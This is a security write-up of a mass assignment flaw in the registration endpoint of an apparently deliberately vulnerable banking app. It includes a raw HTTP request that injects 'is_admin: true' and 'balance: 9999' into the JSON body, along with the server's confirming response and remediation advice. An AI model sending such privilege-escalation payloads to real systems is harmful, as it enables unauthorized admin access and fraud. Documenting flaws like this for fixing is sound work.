# Mass Assignment on Registration

- **Vulnerability Type:** CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **Target / Platform:** `vulnbank.org`
- **Severity / CVSS:** Critical
- **Affected Endpoint:** `POST /register`

---

## 📌 Summary

The registration endpoint accepts client-supplied JSON fields and directly maps them into server-side user attributes without proper allowlisting. As a result, an attacker can add unexpected properties such as `is_admin` and `balance` during account creation.

This behavior allows privilege escalation at the moment of registration and creates a newly created account with attacker-controlled privileges and account state.

---

## 📝 Description

The application exposes a mass assignment issue in the registration flow. Instead of restricting which fields may be set by the client, the server accepts arbitrary JSON properties and stores them as part of the new user object.

During testing, the request body was modified to include `is_admin: true` and `balance: 9999`. The server accepted both values, created the account successfully, and reflected the assigned properties in both the debug headers and the JSON response. This confirms that sensitive fields are being bound directly from user input without server-side validation or field-level access control.

---

## 🎯 Impact

A successful attacker can create an account with elevated privileges and an arbitrary starting balance. In a banking application, this can lead to unauthorized administrative access, account tampering, abuse of privileged endpoints, and fraudulent financial state manipulation.

In the worst case, this issue can result in complete application compromise through unauthorized admin account creation, exposure of internal debug data, and misuse of trusted account attributes that should never be client-controlled.

---

## 🛠️ Proof of Concept

### Steps to Reproduce

1. Open the registration page and prepare a normal user registration request.
2. Enable interception in Burp Suite.
3. Modify the JSON body before forwarding the request.
4. Add privileged or sensitive fields such as:
   - `is_admin: true`
   - `balance: 9999`

5. Forward the request.
6. Observe that the server creates the account with the attacker-supplied values.
7. Log in with the newly created account and confirm the elevated privileges.

---

### Raw HTTP Request

```http id="u7v1c2"
POST /register HTTP/1.1
Host: 127.0.0.1
Content-Length: 52
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/register
Accept-Encoding: gzip, deflate, br
Cookie: token=<valid_user_jwt>
Connection: keep-alive

{
    "username":"user_admin@gmail.com",
    "password":"123",
    "is_admin":true,"balance":9999

}
```

---

### Raw HTTP Response

```http id="q4n8ks"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 718
X-Debug-Info: {'user_id': 18, 'username': 'user_admin@gmail.com', 'account_number': '6142168208', 'balance': 9999.0, 'is_admin': True, 'registration_time': '2026-08-04 13:37:52.245533', 'server_info': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36', 'raw_data': {'username': 'user_admin@gmail.com', 'password': '123', 'is_admin': True, 'balance': 9999}, 'fields_registered': ['username', 'password', 'account_number', 'is_admin', 'balance']}
X-User-Info: id=18;admin=True;balance=9999.00
Access-Control-Allow-Origin: http://127.0.0.1
Vary: Origin
Server: Werkzeug/2.0.1 Python/3.9.25
Date: Tue, 04 Aug 2026 13:37:52 GMT

{
  "debug_data": {
    "account_number": "6142168208",
    "balance": 9999.0,
    "fields_registered": [
      "username",
      "password",
      "account_number",
      "is_admin",
      "balance"
    ],
    "is_admin": true,
    "raw_data": {
      "balance": 9999,
      "is_admin": true,
      "password": "123",
      "username": "user_admin@gmail.com"
    },
    "registration_time": "2026-08-04 13:37:52.245533",
    "server_info": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "user_id": 18,
    "username": "user_admin@gmail.com"
  },
  "message": "Registration successful! Proceed to login",
  "status": "success"
}
```

---

## 🔍 Root Cause

The server does not enforce a strict field allowlist during user registration. Instead, it accepts and persists client-controlled properties directly into the user object.

Sensitive attributes such as `is_admin` and `balance` should be server-managed only, but in this case they are writable by the client. This is the core mass assignment flaw.

---

## ✅ Evidence

- The request body includes `is_admin: true` and `balance: 9999`.
- The response confirms those values were accepted.
- The debug header shows `fields_registered` includes `is_admin` and `balance`.
- `X-User-Info` confirms the account was created with `admin=True`.
- The account can then be used to log in as the newly created privileged user.

---

## 📊 Attack Flow

```text id="l0p7q2"
User opens registration form
        │
        ▼
Attacker intercepts the request
        │
        ▼
Attacker adds sensitive fields
(is_admin=true, balance=9999)
        │
        ▼
Server accepts client-controlled attributes
        │
        ▼
Account is created with elevated privileges
        │
        ▼
Attacker logs in as the new privileged user
```

---

## 🛡️ Remediation

- Use a strict server-side allowlist for fields accepted during registration.
- Ignore or reject any unexpected properties in the request body.
- Never let clients set privileged attributes such as `is_admin`, `role`, or `balance`.
- Keep sensitive account state fully server-controlled.
- Return only minimal response data and avoid exposing internal debug information in production.
- Validate incoming JSON against a schema before persisting it.

---

## 📚 References

- CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes
- OWASP API Security Top 10 — Mass Assignment
- OWASP Cheat Sheet Series — Input Validation

---

## 📝 Notes

This is a classic mass assignment issue in the registration workflow. The server trusts the request body too much and binds user input directly to internal account attributes. The result is a newly created account with attacker-controlled privilege and balance values.
